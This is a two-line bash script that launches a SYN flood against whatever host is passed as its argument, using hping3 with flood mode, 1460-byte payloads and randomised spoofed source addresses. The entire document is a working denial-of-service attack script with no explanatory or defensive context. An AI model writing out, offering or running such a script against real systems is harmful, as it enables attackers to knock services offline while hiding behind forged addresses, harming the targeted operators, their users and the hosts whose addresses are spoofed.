#!/bin/bash
hping3 --flood -d 1460 -S --rand-source $1
